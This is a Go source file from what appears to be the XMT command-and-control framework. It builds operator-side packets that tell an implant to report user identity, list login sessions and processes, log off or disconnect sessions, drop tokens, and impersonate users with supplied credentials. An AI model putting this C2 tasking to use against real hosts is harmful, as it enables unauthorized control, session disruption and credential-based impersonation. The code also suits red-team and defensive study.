//go:build !implant
// +build !implant

// Copyright (C) 2020 - 2023 iDigitalFlame
//
// This program is free software: you can redistribute it and/or modify
// it under the terms of the GNU General Public License as published by
// the Free Software Foundation, either version 3 of the License, or
// any later version.
//
// This program is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
// GNU General Public License for more details.
//
// You should have received a copy of the GNU General Public License
// along with this program.  If not, see <https://www.gnu.org/licenses/>.
//

package task

import "github.com/iDigitalFlame/xmt/com"

// Whoami returns a user discovery Packet. This will instruct the client to query
// it's current token/access and determine a non-cached username/user ID. This
// Task also returns the current Process path the client is in.
//
// The result is NOT cached, so it may be different depending on the client and
// any operations in-between calls.
//
// C2 Details:
//
//	ID: MvWhoami
//
//	Input:
//	    <none>
//	Output:
//	    string // Username
//	    string // Process Path
func Whoami() *com.Packet {
	return &com.Packet{ID: MvWhoami}
}

// RevToSelf returns a Rev2Self Packet. This can be used to instruct Windows
// based devices to drop any previous elevated Tokens they may possess and return
// to their "normal" Token.
//
// This task result does not return any data, only errors if it fails.
//
// Always returns 'ErrNoWindows' on non-Windows devices.
//
// C2 Details:
//
//	ID: TvRevSelf
//
//	Input:
//	    <none>
//	Output:
//	    <none>
func RevToSelf() *com.Packet {
	return &com.Packet{ID: TvRevSelf}
}

// UserLogins returns a current Login sessions Packet. This will instruct the
// client to reterive a list of the current login sessions on the device.
//
// C2 Details:
//
//	ID: TvLogins
//
//	Input:
//	    <none>
//	Output:
//	    uint32               // Count
//	    []Login struct {     // List of Logins
//	        uint32           // Session ID
//	        uint8            // Login Status
//	        int64            // Login Time
//	        int64            // Last Idle Time
//	        Address struct { // From Address
//	            uint64       // High bits of Address
//	            uint64       // Low bits of Address
//	        }
//	        string           // Username
//	        string           // Hostname
//	    }
func UserLogins() *com.Packet {
	return &com.Packet{ID: TvLogins}
}

// UserLogoff returns a logoff user session Packet. This will instruct the client
// to logoff the targeted user session via ID (or -1 for the current session).
//
// C2 Details:
//
//	ID: TvLoginsAct
//
//	Input:
//	    uint8 // Always set to 1 for this task.
//	    int32 // Session ID
//	Output:
//	    <none>
func UserLogoff(sid int32) *com.Packet {
	n := &com.Packet{ID: TvLoginsAct}
	n.WriteUint8(taskLoginsLogoff)
	n.WriteInt32(sid)
	return n
}

// UserDisconnect returns a disconnect user session Packet. This will instruct the
// client to disconnect the targeted user session via ID (or -1 for the current
// session).
//
// C2 Details:
//
//	ID: TvLoginsAct
//
//	Input:
//	    uint8 // Always set to 0 for this task.
//	    int32 // Session ID
//	Output:
//	    <none>
func UserDisconnect(sid int32) *com.Packet {
	n := &com.Packet{ID: TvLoginsAct}
	n.WriteUint8(taskLoginsDisconnect)
	n.WriteInt32(sid)
	return n
}

// UserProcesses returns a list processes Packet. This can be used to instruct
// the client to return a list of the current running host's processes under the
// specified Session ID (or -1/0 for all session processes).
//
// C2 Details:
//
//	ID: TvLoginsProc
//
//	Input:
//	    <none>
//	Output:
//	    uint32          // Count
//	    []ProcessInfo { // List of Running Processes
//	        uint32      // Process ID
//	        uint32      // _
//	        string      // Process Image Name
//	    }
func UserProcesses(sid int32) *com.Packet {
	n := &com.Packet{ID: TvLoginsProc}
	n.WriteInt32(sid)
	return n
}

// LoginUser returns an impersonate user Packet. This will instruct the client to
// use the provided credentials to change it's Token to the user that owns the
// supplied credentials.
//
// If the interactive boolen at the start is true, the client will do an interactive
// login instead. This allows for more access and will change the username, but
// may prevent access to network resources.
//
// Always returns 'ErrNoWindows' on non-Windows devices. (for now).
//
// C2 Details:
//
//	ID: TvLoginUser
//
//	Input:
//	    bool   // Interactive
//	    string // Username
//	    string // Domain
//	    string // Password
//	Output:
//	    <none>
func LoginUser(interactive bool, user, domain, pass string) *com.Packet {
	n := &com.Packet{ID: TvLoginUser}
	n.WriteBool(interactive)
	n.WriteString(user)
	n.WriteString(domain)
	n.WriteString(pass)
	return n
}
